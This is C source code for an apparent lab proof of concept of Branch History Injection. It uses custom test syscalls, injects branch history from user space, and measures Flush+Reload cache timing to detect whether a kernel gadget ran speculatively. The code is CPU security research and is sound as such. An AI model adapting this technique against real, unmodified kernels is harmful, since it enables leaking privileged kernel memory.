#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include "targets.h"
#include "helper.h"

#define BHI_HIT_SYSCALL     441
#define BHI_ENABLE_SYSCALL  442
#define GETPID_SYSCALL      172
#define ITERS               1000

extern void fill_bhb(uint8_t *history, uint64_t syscall_nr, uint8_t *fr_buf_kern);

int main(int argc, char **argv)
{
	uint8_t  hit_history[MAX_HISTORY_SIZE];
	uint8_t  getpid_history[MAX_HISTORY_SIZE];
	uint8_t *fr_buf;
	uint8_t *fr_buf_kern;
	uint64_t t0, dt, avg, min, max;
	int hits = 0;

    //enable perf counter via custom syscall
	syscall(BHI_ENABLE_SYSCALL);   

	//Create a page accessible both from user and kernel
	fr_buf = mmap(NULL, STRIDE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
	memset(fr_buf, 0x41, STRIDE);
	fr_buf_kern = (uint8_t *)(virt_to_physmap((uint64_t) fr_buf));
	printf("%20s: 0x%016lx\n", "fr_buf user", (uint64_t)fr_buf);
	printf("%20s: 0x%016lx\n", "fr_buf kern", (uint64_t)fr_buf_kern);
		
	//Test physmap works
	avg = 0; min = 999999; max = 0;                                                  

	for(int i=0; i<100; i++) {                                                       

		clflush(&fr_buf[0]);                                                     
		fence();                                                                         
		syscall(BHI_HIT_SYSCALL, fr_buf_kern);    
		fence();                                                                         

		dt = load_time(&fr_buf[0]);                                                      

		avg += dt;                                                               
		if(dt > max) max = dt;                                                   
		if(dt < min) min = dt;                                                   
	}                                                                                
	printf("Fast access: avg: %f min: %ld max: %ld\n", (float)avg/100, min, max);    

	avg = 0; min = 999999; max = 0;
	for(int i=0; i<100; i++) {

		clflush(&fr_buf[0]);
		fence();

		dt = load_time(&fr_buf[0]);

		avg += dt;
		if(dt > max) max = dt;
		if(dt < min) min = dt;
	}
	printf("Slow access: avg: %f min: %ld max: %ld\n", (float)avg/100, min, max);
	printf("Threshold: %d\n\n", THR);
    ///////////////////////

	srand(time(0));
	hits = 0;
	//Define once the histories
	for(int i=0; i<MAX_HISTORY_SIZE; i++)    hit_history[i] = rand()&1;
	for(int i=0; i<MAX_HISTORY_SIZE; i++) getpid_history[i] = rand()&1;

	for(int i=0; i<ITERS; i++) {

		//Inject entries in the BTB
		for(int j=0; j<256; j++) {
			fill_bhb(hit_history,    BHI_HIT_SYSCALL,   fr_buf_kern);
			fill_bhb(getpid_history, GETPID_SYSCALL,    NULL);
		}

		//Flush spurios cache access
		clflush(fr_buf);

		//Let's see if user history is used for indirect branch prediction
		fill_bhb(hit_history, GETPID_SYSCALL, fr_buf_kern);

		//Check if fr_buf is in cache, i.e. if fr_gadtet was executed transiently
		dt = load_time(fr_buf);
		if (dt < THR) {
			hits++;
		}
	}

	printf("hits %d/%d\n", hits, ITERS);

	return 0;
}

